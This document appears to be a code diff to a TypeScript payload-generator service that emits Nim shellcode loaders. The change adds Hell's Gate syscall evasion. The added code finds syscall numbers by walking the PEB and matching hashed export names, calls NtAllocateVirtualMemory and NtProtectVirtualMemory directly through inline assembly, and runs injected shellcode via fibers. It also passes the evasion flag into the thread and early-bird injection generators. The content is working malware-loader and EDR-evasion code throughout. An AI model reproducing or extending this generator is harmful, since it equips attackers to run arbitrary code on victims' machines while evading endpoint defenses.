@@ -9,12 +9,13 @@ export class PayloadService {
         }
 
         const directives = [];
-        // ASM needed for PEB check if anti_debug is used
-        if (config.anti_debug.length > 0) {
+        // ASM needed for PEB check, Hell's Gate, or any inline ASM
+        if (config.anti_debug.length > 0 || config.syscall_evasion === 'hells_gate') {
             directives.push('{.passC: "-masm=intel".}');
         }
 
         const utilsBlock = this.generateUtilsBlock(config);
+        const hellsGateInfra = config.syscall_evasion === 'hells_gate' ? this.generateHellsGateInfra() : "";
         const evasionProcs = this.generateEvasionProcs(config);
         const injectionProc = this.generateInjectionProc(config);
         const shellcodeBlock = this.generateShellcodeBlock(config);
@@ -26,6 +27,8 @@ import ${imports.join(', ')}
 ${directives.join('\n')}
 
 ${utilsBlock}
+
+${hellsGateInfra}
 
 ${evasionProcs}
 
@@ -147,19 +150,98 @@ proc pebBeingDebugged(): bool {.asmNoStackFrame.}=
     }
 
     private generateInjectionProc(config: PayloadRequest): string {
+        const useHellsGate = config.syscall_evasion === 'hells_gate';
+
         if (config.injection_method === 'fiber') {
-            return this.generateFiberInjection();
+            return this.generateFiberInjection(useHellsGate);
         } else if (config.injection_method === 'thread') {
-            return this.generateThreadInjection();
+            return this.generateThreadInjection(useHellsGate);
         } else if (config.injection_method === 'early_bird') {
-            return this.generateEarlyBirdInjection();
+            return this.generateEarlyBirdInjection(useHellsGate);
         }
         // process_hollowing not implemented yet
         return "";
     }
 
-    private generateFiberInjection(): string {
-        return `
+    private generateFiberInjection(useHellsGate: boolean): string {
+        if (useHellsGate) {
+            // Hell's Gate version using NT APIs
+            return `
+proc injectShellcode(shellcode: seq[byte]) =
+    let size = shellcode.len
+    
+    # Resolve NtAllocateVirtualMemory syscall
+    var ntAllocEntry = HG_TABLE_ENTRY(dwHash: djb2_hash("NtAllocateVirtualMemory"))
+    if not getSyscall(ntAllocEntry):
+        echo "[-] Failed to resolve NtAllocateVirtualMemory"
+        quit(1)
+    syscall = ntAllocEntry.wSysCall
+    
+    # Allocate RW memory using NT API
+    var baseAddr: PVOID = nil
+    var regionSize: SIZE_T = cast[SIZE_T](size)
+    let allocStatus = NtAllocateVirtualMemory(
+        cast[HANDLE](-1),
+        baseAddr,
+        0,
+        addr regionSize,
+        MEM_COMMIT or MEM_RESERVE,
+        PAGE_READWRITE
+    )
+    
+    if allocStatus != 0:
+        echo "[-] NtAllocateVirtualMemory failed: 0x", toHex(allocStatus)
+        quit(1)
+    
+    # Copy shellcode
+    copyMem(baseAddr, unsafeAddr shellcode[0], size)
+    
+    # Resolve NtProtectVirtualMemory syscall
+    var ntProtectEntry = HG_TABLE_ENTRY(dwHash: djb2_hash("NtProtectVirtualMemory"))
+    if not getSyscall(ntProtectEntry):
+        echo "[-] Failed to resolve NtProtectVirtualMemory"
+        quit(1)
+    syscall = ntProtectEntry.wSysCall
+    
+    # Change protection to RX using NT API
+    var protectAddr: PVOID = baseAddr
+    var protectSize: SIZE_T = cast[SIZE_T](size)
+    var oldProtect: ULONG
+    let protectStatus = NtProtectVirtualMemory(
+        cast[HANDLE](-1),
+        protectAddr,
+        addr protectSize,
+        PAGE_EXECUTE_READ,
+        addr oldProtect
+    )
+    
+    if protectStatus != 0:
+        echo "[-] NtProtectVirtualMemory failed"
+        quit(1)
+    
+    # Convert current thread to fiber
+    let mainFiber = ConvertThreadToFiber(nil)
+    if mainFiber == nil:
+        echo "[-] ConvertThreadToFiber failed"
+        quit(1)
+    
+    # Create fiber pointing to shellcode
+    let hFiber = CreateFiber(0, cast[LPFIBER_START_ROUTINE](baseAddr), nil)
+    if hFiber == nil:
+        echo "[-] CreateFiber failed"
+        discard ConvertFiberToThread()
+        quit(1)
+    
+    echo "[+] Executing shellcode via Fiber (Hell's Gate)..."
+    SwitchToFiber(hFiber)
+    
+    # Cleanup
+    DeleteFiber(hFiber)
+    discard ConvertFiberToThread()
+`;
+        } else {
+            // Standard version using Win32 APIs
+            return `
 proc injectShellcode(shellcode: seq[byte]) =
     let size = shellcode.len
     
@@ -219,9 +301,10 @@ proc injectShellcode(shellcode: seq[byte]) =
     discard ConvertFiberToThread()
     discard VirtualFree(memAddr, 0, MEM_RELEASE)
 `;
+        }
     }
 
-    private generateThreadInjection(): string {
+    private generateThreadInjection(useHellsGate: boolean): string {
         return `
 proc injectShellcode(shellcode: seq[byte]) =
     let size = shellcode.len
@@ -279,7 +362,7 @@ proc injectShellcode(shellcode: seq[byte]) =
 `;
     }
 
-    private generateEarlyBirdInjection(): string {
+    private generateEarlyBirdInjection(useHellsGate: boolean): string {
         return `
 proc injectShellcode(shellcode: seq[byte]) =
     var 
@@ -358,6 +441,152 @@ proc injectShellcode(shellcode: seq[byte]) =
     # Cleanup
     discard CloseHandle(pi.hThread)
     discard CloseHandle(pi.hProcess)
+`;
+    }
+
+    private generateHellsGateInfra(): string {
+        return `
+# ============================================================================
+# Hell's Gate - Syscall Evasion Infrastructure
+# ============================================================================
+
+var syscall*: WORD
+
+type
+    HG_TABLE_ENTRY* = object
+        pAddress*: PVOID
+        dwHash*: uint64
+        wSysCall*: WORD
+    PHG_TABLE_ENTRY* = ptr HG_TABLE_ENTRY
+
+# DJB2 Hash Function
+proc djb2_hash*(pFuncName: string): uint64 =
+    var hash: uint64 = 0x5381
+    for c in pFuncName:
+        hash = ((hash shl 0x05) + hash) + cast[uint64](ord(c))
+    return hash
+
+# Get PEB via inline ASM
+proc GetPEBAsm64*(): PPEB {.asmNoStackFrame.} =
+    asm """
+        mov rax, qword ptr gs:[0x60]
+        ret
+    """
+
+# Helper: Convert Flink to Module
+proc flinkToModule*(pCurrentFlink: LIST_ENTRY): PLDR_DATA_TABLE_ENTRY =
+    return cast[PLDR_DATA_TABLE_ENTRY](cast[ByteAddress](pCurrentFlink) - 0x10)
+
+# Helper: Get module buffer
+proc moduleToBuffer*(pCurrentModule: PLDR_DATA_TABLE_ENTRY): PWSTR =
+    return pCurrentModule.FullDllName.Buffer
+
+# Get Export Table from module
+proc getExportTable*(pCurrentModule: PLDR_DATA_TABLE_ENTRY, pExportTable: var PIMAGE_EXPORT_DIRECTORY): bool =
+    let 
+        pImageBase: PVOID = pCurrentModule.DLLBase
+        pDosHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](pImageBase)
+        pNTHeader: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[ByteAddress](pDosHeader) + pDosHeader.e_lfanew)
+    
+    if pDosheader.e_magic != IMAGE_DOS_SIGNATURE:
+        return false
+    
+    if pNTHeader.Signature != cast[DWORD](IMAGE_NT_SIGNATURE):
+        return false
+    
+    pExportTable = cast[PIMAGE_EXPORT_DIRECTORY](cast[ByteAddress](pImageBase) + pNTHeader.OptionalHeader.DataDirectory[0].VirtualAddress)
+    return true
+
+# Find function in export table and extract syscall number
+proc getTableEntry*(pImageBase: PVOID, pCurrentExportDirectory: PIMAGE_EXPORT_DIRECTORY, tableEntry: var HG_TABLE_ENTRY): bool =
+    var 
+        cx: DWORD = 0
+        numFuncs: DWORD = pCurrentExportDirectory.NumberOfNames
+    let 
+        pAddrOfFunctions: ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfFunctions)
+        pAddrOfNames: ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNames)
+        pAddrOfOrdinals: ptr UncheckedArray[WORD] = cast[ptr UncheckedArray[WORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNameOrdinals)
+    
+    while cx < numFuncs:    
+        var 
+            pFuncOrdinal: WORD = pAddrOfOrdinals[cx]
+            pFuncName: string = $(cast[PCHAR](cast[ByteAddress](pImageBase) + pAddrOfNames[cx]))
+            funcHash: uint64 = djb2_hash(pFuncName)
+            funcRVA: DWORD64 = pAddrOfFunctions[pFuncOrdinal]
+            pFuncAddr: PVOID = cast[PVOID](cast[ByteAddress](pImageBase) + funcRVA)
+        
+        if funcHash == tableEntry.dwHash:
+            tableEntry.pAddress = pFuncAddr
+            # Extract syscall number from function stub (offset +4 after mov r10, rcx)
+            if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xB8:
+                tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4)[]
+            return true
+        inc cx
+    return false
+
+# Get next module in list
+proc getNextModule*(flink: var LIST_ENTRY): PLDR_DATA_TABLE_ENTRY =
+    flink = flink.Flink[]
+    return flinkToModule(flink)
+
+# Search loaded modules for syscall
+proc searchLoadedModules*(pCurrentPeb: PPEB, tableEntry: var HG_TABLE_ENTRY): bool =
+    var 
+        currFlink: LIST_ENTRY = pCurrentPeb.Ldr.InMemoryOrderModuleList.Flink[]
+        currModule: PLDR_DATA_TABLE_ENTRY = flinkToModule(currFlink)                 
+        pExportTable: PIMAGE_EXPORT_DIRECTORY
+    let 
+        beginModule = currModule
+    
+    while true:
+        if getExportTable(currModule, pExportTable):
+            if getTableEntry(currModule.DLLBase, pExportTable, tableEntry):
+                return true
+        
+        currModule = getNextModule(currFlink)
+        if beginModule == currModule:
+            break
+    return false
+
+# Main syscall resolver
+proc getSyscall*(tableEntry: var HG_TABLE_ENTRY): bool =
+    let currentPeb: PPEB = GetPEBAsm64()
+    if not searchLoadedModules(currentPeb, tableEntry):
+        return false
+    return true
+
+# ============================================================================
+# NT API Wrappers (Direct Syscall Invocation)
+# ============================================================================
+
+# NtAllocateVirtualMemory - Replaces VirtualAlloc/VirtualAllocEx
+proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: var PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
+    asm """
+        mov r10, rcx
+        movzx eax, word ptr [rip + \`syscall\`]
+        syscall
+        ret
+    """
+
+# NtProtectVirtualMemory - Replaces VirtualProtect
+proc NtProtectVirtualMemory(ProcessHandle: HANDLE, BaseAddress: var PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
+    asm """
+        mov r10, rcx
+        movzx eax, word ptr [rip + \`syscall\`]
+        syscall
+        ret
+    """
+
+# NtWriteVirtualMemory - Replaces WriteProcessMemory
+proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
+    asm """
+        mov r10, rcx
+        movzx eax, word ptr [rip + \`syscall\`]
+        syscall
+        ret
+    """
+
+# ============================================================================
 `;
     }
 
